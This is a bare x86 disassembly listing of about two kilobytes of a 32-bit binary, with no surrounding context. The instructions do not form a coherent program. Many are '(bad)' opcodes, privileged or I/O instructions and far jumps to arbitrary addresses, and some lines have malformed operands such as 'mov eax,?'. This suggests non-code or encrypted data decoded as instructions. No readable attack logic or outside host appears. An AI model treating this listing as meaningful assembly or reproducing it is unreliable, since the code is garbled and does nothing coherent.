  4044b7:	ins    BYTE PTR es:[edi],dx
  4044b8:	mov    ebx,0x54adec8d
  4044bd:	push   0x1a21a
  4044c2:	es push esi
  4044c4:	mov    esp,0x4b3044ff
  4044c9:	inc    ecx
  4044ca:	xor    DWORD PTR [ebx+0x776974c3],edi
  4044d0:	cmp    esp,edi
  4044d2:	push   es
  4044d3:	(bad)  
  4044d4:	xchg   edi,eax
  4044d5:	dec    ebx
  4044d6:	jo     0x404478
  4044d8:	or     al,al
  4044da:	jge    0x404485
  4044dc:	inc    edx
  4044dd:	(bad)  
  4044de:	mov    ah,0x60
  4044e0:	mov    esi,0x3a0e6ff
  4044e5:	add    BYTE PTR [ecx],dh
  4044e7:	push   ebp
  4044e8:	mov    eax,eax
  4044ea:	xlat   BYTE PTR ds:[ebx]
  4044eb:	(bad)  
  4044ec:	mov    edi,0x3775950
  4044f1:	rdtsc  
  4044f3:	mov    BYTE PTR [ebx-0x5fceff28],bl
  4044f9:	or     al,al
  4044fb:	cmp    al,0xb5
  4044fd:	cmp    BYTE PTR [ebp-0x40a98f],0x31
  404504:	aam    0xf
  404506:	jmp    esp
  404508:	loopne 0x4044c7
  40450a:	call   DWORD PTR [esi-0x62df6c1]
  404510:	pusha  
  404511:	add    ebp,ebx
  404513:	inc    edx
  404514:	dec    ebx
  404515:	sbb    bh,bh
  404517:	add    al,0xe4
  404519:	stos   DWORD PTR es:[edi],eax
  40451a:	lock pop edi
  40451c:	or     ecx,ebp
  40451e:	add    ebp,DWORD PTR [esi+0x3c]
  404521:	and    DWORD PTR [ecx+ebx*2+0x4a03e9df],ebp
  404528:	add    DWORD PTR [esi],ecx
  40452a:	cmp    DWORD PTR [ecx-0x5f],ebx
  40452d:	daa    
  40452e:	(bad)  
  40452f:	xor    DWORD PTR [ecx],ecx
  404531:	ins    BYTE PTR es:[edi],dx
  404532:	mov    DWORD PTR [ebp-0x49],esi
  404535:	idiv   BYTE PTR [esi-0x33cb4a1f]
  40453b:	aaa    
  40453c:	mov    dh,0xe6
  40453e:	stos   DWORD PTR es:[edi],eax
  40453f:	lahf   
  404540:	fsubp  st(1),st
  404542:	add    ebx,DWORD PTR [eax]
  404544:	or     al,0xd6
  404546:	mov    esi,0xcb94b61e
  40454b:	pop    ss
  40454c:	mov    dh,0xc6
  40454e:	stos   DWORD PTR es:[edi],eax
  40454f:	int    0xde
  404551:	jmp    0x1309ff59
  404556:	int    0xf2
  404558:	pop    ebx
  404559:	bound  ebp,QWORD PTR [edi-0x6a334e00]
  40455f:	push   ebx
  404560:	sbb    BYTE PTR [eax+0x3b],0x57
  404564:	jg     0x4044e8
  404566:	sub    al,0x10
  404568:	lods   al,BYTE PTR ds:[esi]
  404569:	sub    BYTE PTR [ecx+0x3],0x31
  40456d:	or     DWORD PTR [edi+edx*1-0xc],esi
  404571:	or     cl,ch
  404573:	add    esi,DWORD PTR [ecx]
  404575:	adc    BYTE PTR [ecx-0x7e381676],0x5
  40457c:	test   al,0x4b
  40457e:	push   ebp
  40457f:	mov    ch,BYTE PTR [ecx+eax*1]
  404582:	jmp    0x9282:0x690d6fbc
  404589:	cmc    
  40458a:	add    DWORD PTR [ebx+0x3201b1b2],edi
  404590:	aas    
  404591:	or     al,BYTE PTR [edx+0x7b]
  404594:	icebp  
  404595:	or     BYTE PTR [eax],al
  404597:	jmp    0xeb0327ce
  40459c:	mov    edx,0xbd1545b5
  4045a1:	pop    ebp
  4045a2:	cmp    BYTE PTR [ecx+ebp*1-0x47],ch
  4045a6:	(bad)  
  4045a7:	out    dx,eax
  4045a8:	xor    eax,0x6f8644ea
  4045ad:	dec    esi
  4045ae:	add    al,0x70
  4045b0:	fcmovnb st,st(3)
  4045b2:	out    dx,eax
  4045b3:	es in  al,dx
  4045b5:	add    dh,bh
  4045b7:	adc    eax,0xa7c790b8
  4045bc:	es aas 
  4045be:	push   esp
  4045bf:	sbb    eax,DWORD PTR [eax]
  4045c1:	inc    ebp
  4045c2:	mov    ah,0x75
  4045c4:	int    0xe4
  4045c6:	or     BYTE PTR ds:[esi+esi*2-0x47],ah
  4045cb:	push   eax
  4045cc:	sar    DWORD PTR [esi],0x9
  4045cf:	add    cl,ch
  4045d1:	into   
  4045d2:	jb     0x4045d8
  4045d4:	jmp    0x34cb4f0b
  4045d9:	and    eax,0x540fa5b8
  4045de:	dec    edi
  4045df:	pop    ecx
  4045e0:	inc    edx
  4045e1:	(bad)  
  4045e2:	ret    0xedc2
  4045e5:	xor    bl,BYTE PTR [esi-0x75]
  4045e8:	test   DWORD PTR [eax+0x7c37fccd],esi
  4045ee:	pop    ecx
  4045ef:	push   ebx
  4045f0:	sbb    BYTE PTR [ebx-0x80],ah
  4045f3:	jne    0x4045e2
  4045f5:	mov    ecx,0x76620836
  4045fa:	sbb    DWORD PTR [ecx+0x780f124],ecx
  404600:	jb     0x40460e
  404602:	or     eax,0x803aae8b
  404607:	push   edi
  404608:	in     eax,0xa9
  40460a:	mov    dl,0x33
  40460c:	push   ebx
  40460d:	nop
  40460e:	scas   eax,DWORD PTR es:[edi]
  40460f:	xor    eax,DWORD PTR [eax]
  404611:	repnz add DWORD PTR [edi+eax*1-0x2895d390],0xffffff8b
  40461a:	push   cs
  40461b:	rol    eax,0x8f
  40461e:	or     ebx,eax
  404620:	mov    edx,DWORD PTR [ebx]
  404622:	mov    edx,0x100023f8
  404627:	mov    edx,0x1ddc8df8
  40462c:	push   esi
  40462d:	mov    bh,0xf
  40462f:	add    edx,DWORD PTR gs:[esi+0x5c]
  404633:	mov    edx,0x8bd85b0c
  404639:	clc    
  40463a:	jnp    0x4046ad
  40463c:	and    edi,edx
  40463e:	jnp    0x4046b1
  404640:	lea    ecx,[edi+eiz*1+0x2c2070d1]
  404647:	or     cl,BYTE PTR [esi+0x8]
  40464a:	leave  
  40464b:	(bad)  
  40464c:	adc    DWORD PTR [ebx],eax
  40464e:	rol    BYTE PTR [eax-0x570fcc06],cl
  404654:	clc    
  404655:	xor    esi,eax
  404657:	sbb    BYTE PTR [edi+ebx*1-0x3e423a0a],0xb
  40465f:	push   esi
  404660:	or     al,0xc1
  404662:	fwait
  404663:	sbb    eax,0x6f63d903
  404668:	xor    edi,edx
  40466a:	jmp    0x4046dc
  40466c:	xor    edi,edx
  40466e:	jne    0x4045fc
  404670:	pop    es
  404671:	scas   eax,DWORD PTR es:[edi]
  404672:	(bad)  
  404673:	repz hlt 
  404675:	add    ecx,DWORD PTR [esi]
  404677:	sbb    eax,0x8cfc0c1
  40467c:	ret    
  40467d:	mov    eax,DWORD PTR [ebx-0x47]
  404680:	clc    
  404681:	and    edx,DWORD PTR [eax]
  404683:	mov    ecx,0x1d1c8df8
  404688:	sub    al,dh
  40468a:	add    BYTE PTR [ecx],dh
  40468c:	and    eax,DWORD PTR [ebx+eax*1-0x1]
  404690:	mov    ebp,0x9f3dc2c2
  404695:	ror    DWORD PTR [ebx+0x23b8ae89],cl
  40469b:	jnp    0x40464b
  40469d:	mov    eax,0x10d2a58d
  4046a2:	inc    esi
  4046a3:	and    DWORD PTR [edx+0x0],ebx
  4046a6:	dec    esi
  4046a7:	dec    ecx
  4046a8:	loope  0x40466b
  4046aa:	adc    DWORD PTR [edx],esi
  4046ac:	call   0x1a634138
  4046b1:	loopne 0x4046ab
  4046b3:	add    cl,BYTE PTR [edx]
  4046b5:	mov    ds,WORD PTR [esi+eiz*1+0x3c4696a1]
  4046bc:	sahf   
  4046bd:	pop    ebp
  4046be:	sbb    al,0x70
  4046c0:	ficom  WORD PTR [ebx+eax*1]
  4046c3:	or     BYTE PTR [eax],bh
  4046c5:	mov    ebp,0xbf002b33
  4046ca:	xor    ebx,DWORD PTR [ebx]
  4046cc:	add    BYTE PTR cs:[edi],0xf9
  4046d0:	cmp    BYTE PTR [ecx+ebp*2-0x3f1c1dce],al
  4046d7:	icebp  
  4046d8:	stos   DWORD PTR es:[edi],eax
  4046d9:	push   es
  4046da:	ret    
  4046db:	stos   BYTE PTR es:[edi],al
  4046dc:	ja     0x4046d5
  4046de:	clc    
  4046df:	push   edx
  4046e0:	js     0x4046d9
  4046e2:	clc    
  4046e3:	mov    esp,0xdeaf1334
  4046e8:	in     al,dx
  4046e9:	mov    es,WORD PTR [ebx]
  4046eb:	xchg   esp,eax
  4046ed:	(bad)
  4046f1:	lahf   
  4046f2:	ror    DWORD PTR [ebx+0x23be6fc9],cl
  4046f8:	retf   
  4046f9:	outs   dx,DWORD PTR ds:[esi]
  4046fa:	mov    esi,0x74abad8d
  4046ff:	pop    ebx
  404700:	mov    dh,0x23
  404702:	pop    es
  404703:	dec    esi
  404704:	pop    ecx
  404705:	or     DWORD PTR [eax],ebp
  404707:	lds    eax,FWORD PTR [eax+0x6]
  40470a:	xor    ecx,DWORD PTR [edi-0x18af0965]
  404710:	cdq    
  404711:	not    BYTE PTR [eax-0x77]
  404714:	lods   eax,DWORD PTR ds:[esi]
  404715:	adc    al,BYTE PTR [edi-0x15801a2d]
  40471b:	pop    ecx
  40471c:	dec    ebp
  40471d:	enter  0x122a,0x32
  404721:	shl    BYTE PTR [edx-0x43],1
  404724:	and    ch,BYTE PTR [edi-0x50dd4136]
  40472a:	ins    BYTE PTR es:[edi],dx
  40472b:	xor    BYTE PTR [esi],0xe7
  40472e:	not    DWORD PTR [ebx-0xc58fa36]
  404734:	jno    0x4046ff
  404736:	out    dx,al
  404737:	push   es
  404738:	jb     0x4047b8
  40473a:	add    dh,bh
  40473c:	cmp    esi,esp
  40473e:	lock idiv BYTE PTR [ecx]
  404741:	test   BYTE PTR [ebp+0x13],dl
  404744:	ret    0x8137
  404747:	mov    eax,0xc5155b32
  40474c:	repz add al,0xea
  40474f:	shr    DWORD PTR [edx+0xbf1ab0],cl
  404755:	push   edx
  404756:	scas   eax,DWORD PTR es:[edi]
  404757:	cli    
  404758:	mov    esi,0x89ee84b4
  40475d:	jb     0x40478f
  40475f:	pop    DWORD PTR [esi]
  404761:	addr16 icebp 
  404763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404764:	les    eax,FWORD PTR [eax+0x6]
  404767:	mov    bl,0x8e
  404769:	jmp    0x404760
  40476b:	mov    al,ds:0x90f5d9e6
  404770:	mov    BYTE PTR [ebp-0x7af437ef],dh
  404776:	aas    
  404777:	jmp    0x3211:0xaac80559
  40477e:	rol    BYTE PTR [eax],1
  404780:	bound  esi,QWORD PTR [ebp-0xb]
  404783:	cli    
  404784:	retf   0xf5ec
  404787:	clc    
  404788:	je     0x4047b0
  40478a:	or     ah,BYTE PTR [edx+0x4]
  40478d:	cmp    edi,DWORD PTR [ebx-0x376950fd]
  404793:	shl    ah,0x37
  404796:	(bad)  
  404797:	mov    eax,DWORD PTR [edx+0x7f]
  40479a:	mov    ecx,0xae874023
  40479f:	lea    ebx,[ebp+0x23]
  4047a2:	dec    ecx
  4047a3:	mov    bl,0xa9
  4047a5:	jb     0x4047ac
  4047a7:	push   esi
  4047a8:	add    DWORD PTR [esi+eax*8+0x9],ebp
  4047ac:	jmp    0xe594:0xdaf87d82
  4047b3:	cli    
  4047b4:	fimul  DWORD PTR [edx+0xf68c83]
  4047ba:	fisttp QWORD PTR [esi+0x5e]
  4047bd:	(bad)  
  4047be:	aaa    
  4047bf:	inc    ebx
  4047c0:	sub    al,0x28
  4047c2:	ins    DWORD PTR es:[edi],dx
  4047c3:	add    al,BYTE PTR [ebx]
  4047c5:	and    edi,DWORD PTR [edi+0xce033b3]
  4047cb:	mov    ecx,0x8db6e333
  4047d0:	pop    ds
  4047d1:	xor    eax,0x77
  4047d4:	jmp    0xc40a70c3
  4047d9:	(bad)  ds:0x4c08bd2
  4047df:	mov    ah,0x23
  4047e1:	mov    bl,0xfc
  4047e3:	mov    cl,0x8d
  4047e5:	xor    BYTE PTR gs:[esi+0x10],cl
  4047e9:	(bad)  
  4047ea:	add    BYTE PTR ds:0xc9f3f546,cl
  4047f0:	add    eax,0xfb84edea
  4047f5:	fimul  DWORD PTR [edx-0x74ff0714]
  4047fb:	ins    DWORD PTR es:[edi],dx
  4047fc:	lea    edx,[edi+eiz*8-0x35bbebab]
  404803:	add    eax,0xc7d92856
  404808:	or     DWORD PTR [ebx],eax
  40480a:	push   0x1233f87e
  40480f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404810:	cli    
  404811:	xor    eax,DWORD PTR [eax]
  404813:	mov    BYTE PTR [edi+ecx*1-0x275e94e7],cl
  40481a:	fwait
  40481b:	inc    edx
  40481c:	cmp    al,0xc1
  40481e:	add    BYTE PTR [ecx+0x3],cl
  404821:	add    ecx,edx
  404823:	adc    ebp,DWORD PTR [edi+0x33]
  404826:	stc    
  404827:	cmp    ebp,DWORD PTR [ebp+0x33]
  40482a:	cli    
  40482b:	fst    QWORD PTR [eax-0x29ec37e1]
  404831:	out    0x3,eax
  404833:	sahf   
  404834:	sbb    al,0xc1
  404836:	ret    
  404837:	inc    esp
  404838:	add    eax,0xb6318bd9
  40483d:	cli    
  40483e:	and    esi,DWORD PTR [edx]
  404840:	mov    dh,0xf8
  404842:	(bad)  
  404843:	les    ecx,FWORD PTR [ecx]
  404845:	out    0xcd,al
  404847:	cmp    DWORD PTR [edx+eax*1-0x3f33cbba],ebp
  40484e:	add    eax,0xfb8bc50b
  404853:	cmp    ebp,DWORD PTR [ebp+0x23]
  404856:	stc    
  404857:	sub    ebp,DWORD PTR [esi-0x73]
  40485a:	xchg   esp,eax
  40485b:	out    0xd9,eax
  40485d:	pop    es
  40485e:	aaa    
  40485f:	retf   
  404860:	add    al,0x56
  404862:	cmp    cl,cl
  404864:	lds    ecx,FWORD PTR [ecx]
  404866:	add    ecx,eax
  404868:	jl     0x404862
  40486a:	xor    edx,DWORD PTR [edx-0x6fcc055c]
  404870:	xchg   BYTE PTR [edi+ecx*1-0x2af9e0cf],cl
  404877:	lds    esp,FWORD PTR [edx+0x60f00c49]
  40487d:	or     DWORD PTR [ebx],eax
  40487f:	jmp    0x4048bb
  404881:	mov    ebp,0xc2b80033
  404886:	mov    ebx,0x974cab33
  40488b:	pop    ds
  40488c:	xchg   esp,eax
  40488d:	lods   eax,DWORD PTR ds:[esi]
  40488e:	pop    ebp
  40488f:	inc    ebp
  404890:	xor    dh,BYTE PTR [eax-0x1d]
  404893:	shl    BYTE PTR [edx-0x53],0x4
  404897:	fnstcw WORD PTR [edx+0x52faf458]
  40489d:	dec    esp
  40489e:	hlt    
  40489f:	clc    
  4048a0:	lods   al,BYTE PTR ds:[esi]
  4048a1:	and    eax,0x42880500
  4048a6:	push   0x3
  4048a8:	div    DWORD PTR [ebp-0x5cd33f3e]
  4048ae:	les    ecx,FWORD PTR [ebx+0x23bbd25a]
  4048b4:	pop    eax
  4048b5:	sar    BYTE PTR [ebp+ecx*4-0x5c44495b],cl
  4048bc:	push   esi
  4048bd:	add    eax,0xe1295604
  4048c2:	les    ecx,FWORD PTR [ecx]
  4048c4:	xor    dl,BYTE PTR [edx]
  4048c6:	mov    eax,?
  4048c8:	bound  edi,QWORD PTR [edx-0x579d051d]
  4048ce:	mov    DWORD PTR [esi+ebp*1-0x7190fd37],ecx
  4048d5:	mov    ds:0x61f01c45,eax
  4048da:	push   es
  4048db:	add    edi,ebx
  4048dd:	cmp    edi,DWORD PTR [edx-0x43fc07cd]
  4048e3:	xor    edi,ebx
  4048e5:	and    eax,0xbb001f98
  4048ea:	or     al,0xea
  4048ec:	mov    WORD PTR [edx],?
  4048ee:	or     DWORD PTR [edi-0xc],eax
  4048f1:	icebp  
  4048f2:	retf   0x2f5
  4048f5:	clc    
  4048f6:	adc    BYTE PTR [eax-0x6e05370d],0x89
  4048fd:	lods   eax,DWORD PTR ds:[esi]
  4048fe:	push   es
  4048ff:	sub    edi,ebp
  404901:	mov    eax,0x1d3deaae
  404906:	enter  0xa9,0x32
  40490a:	retf   0xbb62
  40490d:	bound  esi,QWORD PTR [eax-0x6a5343e6]
  404913:	test   BYTE PTR [edi+ebx*4-0x18fc91c8],0xe8
  40491b:	daa    
  40491c:	ret    0xa3a
  40491f:	sbb    DWORD PTR [ebx-0xcbe0587],ecx
  404925:	js     0x4049a3
  404927:	gs pop es
  404929:	adc    ebp,DWORD PTR [eax]
  40492b:	dec    esp
  40492c:	sub    DWORD PTR [edx],esi
  40492e:	aas    
  40492f:	aad    0xc4
  404931:	jo     0x40494c
  404933:	jmp    0x2bb:0xdab3aac9
  40493a:	mov    al,0x5c
  40493c:	cwde   
  40493d:	es std 
  40493f:	shl    BYTE PTR [eax-0x460f5c4],0x71
  404946:	retf   0x2de
  404949:	or     BYTE PTR [edx+0x2800f2f0],al
  40494f:	cli    
  404950:	loope  0x4048da
  404952:	mov    ch,0x5
  404954:	and    eax,0xea64d7aa
  404959:	cmp    eax,0xffa9c835
  40495e:	xor    ecx,edx
  404960:	jb     0x40491c
  404962:	inc    edx
  404963:	mov    al,0xfa
  404965:	mov    ebx,0xde0094a4
  40496a:	pop    ebp
  40496b:	mov    esi,0x573222de
  404970:	adc    BYTE PTR [eax-0x46fcfe10],ch
  404976:	stos   DWORD PTR es:[edi],eax
  404977:	mov    al,0x33
  404979:	xchg   edx,eax
  40497a:	ret    
  40497b:	scas   eax,DWORD PTR es:[edi]
  40497c:	lea    ebx,[ebp+0x2f]
  40497f:	sub    DWORD PTR [ebx+0x42],ecx
  404982:	mov    WORD PTR [ecx],cs
  404984:	dec    esi
  404985:	fucomp st(5)
  404987:	(bad)  
  404988:	adc    dl,ch
  40498a:	js     0x40490d
  40498c:	cli    
  40498d:	mov    edx,0x74f8f9ea
  404992:	(bad)  
  404993:	or     eax,0x6f1f9d70
  404998:	add    esi,DWORD PTR [edi-0x93c3766]
  40499e:	xor    edx,eax
  4049a0:	mov    eax,DWORD PTR [eax-0x7d]
  4049a3:	scas   eax,DWORD PTR es:[edi]
  4049a4:	xor    eax,DWORD PTR [edx-0x57]
  4049a7:	test   BYTE PTR [edi],al
  4049a9:	das    
  4049aa:	and    al,0x92
  4049ac:	sub    dl,ch
  4049ae:	and    al,0xf5
  4049b0:	shr    BYTE PTR [ecx],0x0
  4049b3:	pop    esi
  4049b4:	or     al,bl
  4049b6:	jb     0x404953
  4049b8:	stc    
  4049b9:	clc    
  4049ba:	fimul  DWORD PTR [edx-0x77096b85]
  4049c0:	in     eax,0xa0
  4049c2:	adc    esi,DWORD PTR [ebx]
  4049c4:	pop    ss
  4049c5:	shr    DWORD PTR [ebx],0x2b
  4049c8:	or     dl,al
  4049ca:	(bad)  
  4049cb:	jmp    0x8c7e:0xe8bafaf8
  4049d2:	neg    BYTE PTR [edi+0x30b5eef9]
  4049d8:	cmp    ecx,DWORD PTR [eax+ebp*4]
  4049db:	repnz sbb DWORD PTR [ebx],eax
  4049de:	mov    ds:0x33afb8,eax
  4049e3:	lock mov edx,0x16548df8
  4049e9:	add    eax,0x309501d
  4049ee:	pop    esi
  4049ef:	add    al,cl
  4049f1:	ret    
  4049f2:	pop    ss
  4049f3:	retf   
  4049f4:	iret   
  4049f5:	mov    edi,ecx
  4049f7:	sti    
  4049f8:	jb     0x404a2d
  4049fa:	sti    
  4049fb:	push   ebp
  4049fc:	mov    DWORD PTR [edi],eax
  4049fe:	cmp    DWORD PTR [eax+0xe03d9d9],ecx
  404a04:	test   eax,0x9ccc0c0
  404a09:	ret    
  404a0a:	mov    esp,DWORD PTR [ebx]
  404a0c:	mov    edx,0x842033f8
  404a11:	xchg   esp,eax
  404a12:	pop    ss
  404a13:	in     eax,dx
  404a14:	(bad)  
  404a15:	(bad)  
  404a17:	add    BYTE PTR [ebx+0x5ac1303e],cl
  404a1d:	add    al,BYTE PTR [ebx]
  404a1f:	rcl    BYTE PTR [ebx],1
  404a21:	ins    DWORD PTR es:[edi],dx
  404a22:	xor    edi,ebx
  404a24:	jnp    0x404a98
  404a26:	lea    ecx,[edi+eax*4-0x785d8390]
  404a2d:	or     DWORD PTR [esi+0x3c],ecx
  404a30:	sbb    eax,ecx
  404a32:	adc    BYTE PTR [ebx],al
  404a34:	and    al,BYTE PTR [edx-0x45efcc06]
  404a3a:	clc    
  404a3b:	(bad)  
  404a3c:	les    edx,FWORD PTR ds:0xc9045665
  404a42:	add    ebx,DWORD PTR [esi+0x40]
  404a45:	mov    ebx,0xbfcf4b17
  404a4b:	jmp    DWORD PTR [edi]
  404a4d:	jne    0x404a4e
  404a4f:	xor    esp,DWORD PTR [edx]
  404a51:	add    ebx,edi
  404a53:	xor    edx,DWORD PTR [ecx]
  404a55:	add    DWORD PTR [edi+eax*1-0xbd758b4],0x31
  404a5d:	lahf   
  404a5e:	std    
  404a5f:	shl    cl,0xa3
  404a62:	add    bl,al
  404a64:	mov    esi,0xf6ffb4c2
  404a69:	scas   al,BYTE PTR es:[edi]
  404a6a:	mov    edx,0xb8aee90b
  404a6f:	lea    edi,[ebp+0xbff8cd2]
  404a75:	fild   WORD PTR [eax]
  404a77:	push   esi
  404a78:	xor    eax,0xac161
  404a7d:	xor    dh,BYTE PTR [edx+0x74]
  404a80:	inc    esi
  404a82:	jp     0x404a38
  404a84:	xor    edi,DWORD PTR [edx-0x46cc464a]
  404a8a:	sbb    al,0x87
  404a8c:	(bad)  
  404a8e:	mov    esi,0xc32ab8f
  404a93:	cld    
  404a94:	shl    BYTE PTR [eax-0x4e],0x0
  404a98:	retf   0x4ad6
  404a9b:	mov    ah,0xff
  404a9d:	mov    cs,WORD PTR [esi]
  404a9f:	mov    esp,0xba0e880b
  404aa4:	lea    ebx,[ebp-0x5d60055e]
  404aaa:	in     eax,dx
  404aab:	call   FWORD PTR [ebp+0x45]
  404aae:	loope  0x404a6f
  404ab0:	adc    eax,0xff741932
  404ab5:	pop    esi
  404ab6:	loop   0x404a6b
  404ab8:	xor    ebx,DWORD PTR [ebx-0x4a]
  404abb:	mov    eax,0x7f244833
  404ac0:	pop    es
  404ac1:	jb     0x404b3b
  404ac3:	pop    eax
  404ac4:	xor    bl,BYTE PTR gs:[ebx+esi*8-0x40]
  404ac9:	jno    0x404a6e
  404acb:	add    bl,al
  404acd:	out    dx,al
  404ace:	mov    bl,0xb3
  404ad0:	jmp    DWORD PTR [esi]
  404ad2:	jo     0x404a8e
  404ad4:	or     ebx,DWORD PTR [ecx]
  404ad6:	or     bl,BYTE PTR [edx]
  404ad8:	scas   eax,DWORD PTR es:[edi]
  404ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ada:	xchg   ebp,eax
  404adb:	not    BYTE PTR [ebp+0x765fdfd]
  404ae1:	add    BYTE PTR [edi-0x3],bl
  404ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ae5:	(bad)  
  404ae6:	sub    eax,DWORD PTR [esi]
  404ae8:	cdq    
  404ae9:	jae    0x404ae1
  404aeb:	stos   BYTE PTR es:[edi],al
  404aec:	mov    esi,0xe2ae22b3
  404af1:	lods   eax,DWORD PTR ds:[esi]
  404af2:	and    dh,BYTE PTR [ecx+0x2c2e805c]
  404af8:	popf   
  404af9:	mov    ds:0xdc2f06d6,eax
  404afe:	icebp  
  404aff:	enter  0x6e6,0xfb
  404b03:	push   0xffffff8e
  404b05:	mov    bl,0xbe
  404b07:	stos   BYTE PTR es:[edi],al
  404b08:	mov    edx,0xbab02aab
  404b0d:	lods   eax,DWORD PTR ds:[esi]
  404b0e:	mov    esp,0x4d4d68d
  404b13:	test   DWORD PTR [edi+eax*1-0x1],esp
  404b17:	add    al,0x28
  404b19:	(bad)  
  404b1a:	cmp    al,0x6
  404b1c:	inc    eax
  404b1d:	jae    0x404aad
  404b1f:	stos   BYTE PTR es:[edi],al
  404b20:	push   esi
  404b21:	mov    bl,0x42
  404b23:	scas   eax,DWORD PTR es:[edi]
  404b24:	loop   0x404ad4
  404b26:	inc    edx
  404b27:	mov    al,0x74
  404b29:	mov    BYTE PTR [esi],ch
  404b2b:	cmp    bh,BYTE PTR [edi-0x50fa21a5]
  404b31:	jecxz  0x404ba4
  404b33:	leave  
  404b34:	out    0x6,eax
  404b36:	jb     0x404ba2
  404b38:	es mov bl,0x56
  404b3b:	stos   BYTE PTR es:[edi],al
  404b3c:	fisubr DWORD PTR [edx+edi*1-0x4b51254f]
  404b43:	xchg   ebp,eax
  404b44:	mul    BYTE PTR [ebx+0x6dd5700]
  404b4a:	pop    es
  404b4b:	fucomip st,st(4)
  404b4d:	daa    
  404b4e:	(bad)  
  404b4f:	cmp    eax,DWORD PTR [esi]
  404b51:	add    BYTE PTR [ecx],bl
  404b53:	mov    ds:0xe3eeffaa,al
  404b58:	cmc    
  404b59:	cli    
  404b5a:	repnz (bad) 
  404b5c:	cmc    
  404b5d:	imul   DWORD PTR [esi+ecx*4-0x6]
  404b61:	adc    ebp,DWORD PTR [edx]
  404b63:	sub    al,0x66
  404b65:	add    ebx,DWORD PTR [edi]
  404b67:	sub    eax,0x2ff6c1c8
  404b6c:	mov    edi,0xa9a3bebf
  404b71:	(bad)  
  404b72:	cli    
  404b73:	call   0x9c7b:0x8cfaf8fd
  404b7a:	push   es
  404b7b:	dec    esp
  404b7c:	sbb    BYTE PTR [eax],cl
  404b7e:	das    
  404b7f:	ss dec ebx
  404b81:	xor    al,0xa8
  404b83:	out    dx,eax
  404b84:	adc    eax,DWORD PTR [ebx]
  404b86:	mov    al,0x43
  404b88:	stos   BYTE PTR es:[edi],al
  404b89:	inc    DWORD PTR [esi-0xd060a7d]
  404b8f:	fcomip st,st(5)
  404b91:	clc    
  404b92:	fs scas al,BYTE PTR es:[edi]
  404b94:	add    DWORD PTR [edx+0x3b207ef],eax
  404b9a:	scas   eax,DWORD PTR es:[edi]
  404b9b:	inc    edx
  404b9c:	enter  0xe7c0,0x37
  404ba0:	(bad)  
  404ba1:	mov    edi,0xffa9c356
  404ba6:	sbb    cl,ah
  404ba8:	std    
  404ba9:	idiv   edx
  404bab:	add    bh,al
  404bad:	jnp    0x404b43
  404baf:	(bad)  
  404bb0:	imul   esi,DWORD PTR [edi+0x532f743a],0xfe74282c
  404bba:	add    bh,BYTE PTR [ecx]
  404bbc:	jecxz  0x404b67
  404bbe:	call   FWORD PTR [esi]
  404bc0:	xor    ebp,0xfffffffa
  404bc3:	loop   0x404b59
  404bc5:	cmc    
  404bc6:	neg    DWORD PTR [esi+edi*4-0x7]
  404bca:	mov    edx,0x2acf1a00
  404bcf:	add    ebx,esi
  404bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bd2:	rol    cl,0xf
  404bd5:	adc    dl,cl
  404bd7:	mov    edi,0xffff5b0f
  404bdc:	cmp    esi,DWORD PTR [ebp+0xb]
  404bdf:	stc    
  404be0:	sub    esi,DWORD PTR [edi-0x73]
  404be3:	pushf  
  404be4:	(bad)  
  404be5:	jnp    0x404bba
  404be7:	xchg   bl,dh
  404be9:	push   cs
  404bea:	pop    esi
  404beb:	and    al,0xc9
  404bed:	into   
  404bee:	adc    eax,0x7d269103
  404bf3:	or     cl,bl
  404bf5:	adc    DWORD PTR [ecx],eax
  404bf7:	pop    edi
  404bf8:	aam    0xb
  404bfa:	dec    edi
  404bfb:	or     cl,cl
  404bfd:	inc    ecx
  404bfe:	or     al,0xff
  404c00:	sbb    eax,0x18768d59
  404c05:	or     cl,BYTE PTR [ecx-0xa55df1]
  404c0b:	pop    edx
  404c0c:	adc    DWORD PTR [esi+0x58],edx
  404c0f:	pop    edi
  404c10:	add    BYTE PTR [esi+0x64],cl
  404c13:	ret    0x980c
  404c16:	aas    
  404c17:	mov    ebp,esp
  404c19:	or     edx,ecx
  404c1b:	clc    
  404c1c:	push   edi
  404c1d:	(bad)  
  404c1e:	cmp    eax,0xcec45c7
  404c23:	add    BYTE PTR [eax],al
  404c25:	cwde   
  404c26:	pop    ecx
  404c27:	jne    0x404c35
  404c29:	fisttp WORD PTR [edi-0x8]
  404c2c:	mov    DWORD PTR [ebp+0x58418d4c],0x7745230b
  404c36:	rol    DWORD PTR ds:0x4bfd44,1
  404c3c:	mov    DWORD PTR [ebx],eax
  404c3e:	push   0xe455c7ef
  404c43:	mov    WORD PTR [ecx+0x31],es
  404c46:	mov    dl,0xb1
  404c48:	fdivr  QWORD PTR [ebx+0x1a]
  404c4b:	leave  
  404c4c:	add    eax,0x431ce5
  404c51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c52:	jle    0x404c49
  404c54:	pmaxsw mm6,QWORD PTR [ebx+edx*2-0x4c4d8f73]
  404c5c:	loope  0x404c61
  404c5e:	jae    0x404bfc
  404c60:	sbb    al,0xba
  404c62:	in     al,dx
  404c63:	sti    
  404c64:	add    ch,BYTE PTR [esi+edi*4+0x1d]
  404c68:	inc    eax
  404c69:	mov    esi,ebx
  404c6b:	jle    0x404cae
  404c6d:	xor    DWORD PTR [edx],eax
  404c6f:	pushf  
  404c70:	inc    eax
  404c71:	aam    0x66
  404c73:	mov    al,0x83
  404c75:	add    BYTE PTR [esi+ebx*2+0x43],ch
  404c79:	call   0x43fe6b
  404c7e:	mov    dl,0xfc
  404c80:	stos   DWORD PTR es:[edi],eax
  404c81:	inc    eax
  404c82:	inc    edx
  404c83:	push   0x32c95d7c
  404c88:	les    eax,FWORD PTR [eax-0x56]
  404c8b:	in     al,dx
  404c8c:	sti    
  404c8d:	add    ch,BYTE PTR [esi+ecx*4+0x54]
  404c91:	push   0x423505
  404c96:	add    DWORD PTR [edx+0x369ee50a],ecx
  404c9c:	add    bl,BYTE PTR [ebp-0x6b]
  404c9f:	test   DWORD PTR [ebx+0x370bc54],0xf84ab280
  404ca9:	jne    0x404cc5
  404cab:	xor    ebx,DWORD PTR [eax+ecx*1-0x5c7c6403]
  404cb2:	lds    esi,FWORD PTR [edx+eax*2]
  404cb5:	add    BYTE PTR [ecx],dh
